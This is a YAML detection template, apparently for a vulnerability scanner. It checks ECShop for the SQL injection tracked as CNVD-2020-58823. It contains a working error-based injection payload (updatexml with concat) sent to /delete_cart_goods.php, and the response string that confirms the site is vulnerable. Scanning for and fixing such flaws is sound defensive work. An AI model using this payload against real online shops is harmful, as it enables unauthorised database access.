app: ECShop
query: header:"ecs_id"
meta:
  name: Ecshop CNVD-2020-58823-SQLI
  level: 4
  tags:
    - sql_injection
  description: 参数过滤不严谨导致sql注入
  homepage: https://www.ecshop.com/
  author: 一曲成殇
  references: https://mp.weixin.qq.com/s/1t0uglZNoZERMQpXVVjIPw
  solution: 对请求参数进行过滤。
  steps:
    verify_steps:
      type: and
      verify:
        - request:
            method: POST
            path: /delete_cart_goods.php
            redirect: true
            header: [ ]
            params: id=0||(updatexml(1,concat(0x7e,(select%20md5(hevcstools)),0x7e),1))
          response:
            - name: body
              value: 7d41f560a1970ad115f25797dd157ff
              type: contains
            - name: code
              value: "200"
              type: equals
  create_at: "2021-11-09 22:26:47"
